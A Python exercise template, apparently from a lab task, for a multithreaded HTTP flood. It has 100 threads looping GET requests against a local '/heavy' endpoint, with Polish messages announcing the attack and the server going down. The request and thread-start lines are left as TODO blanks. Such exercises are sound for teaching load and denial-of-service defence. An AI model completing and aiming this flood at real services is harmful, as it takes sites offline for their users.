import requests
import threading

TARGET_URL = "http://127.0.0.1:8080/heavy" 
THREADS = 100 

def attack():
    session = requests.Session()
    while True:
        try:
            
            # TODO: Make HTTP GET request to TARGET_URL with 5 second timeout
            # Store the response in a variable called 'response'
            # Hint: Use session.get() with appropriate parameters
            
            response =    
            print(f"Atak trwa... Status: {response.status_code}")
        except requests.exceptions.RequestException:
            print("!!! SERWER POWALONY (Błąd połączenia) !!!")

print(f"Uruchamiam atak na {TARGET_URL} przy użyciu {THREADS} wątków...")

for i in range(THREADS):
    
    # TODO: Create a Thread object that targets the 'attack' function
    # Store it in a variable called 't'
    # Hint: Use threading.Thread(target=...)
    
    t = 
    # daemon=True sprawi, ze skrypt zamknie sie od razu po Ctrl+C
    t.daemon = True

    # TODO: Start the thread
    # Use the appropriate method on the thread object
    t.

while True:
    pass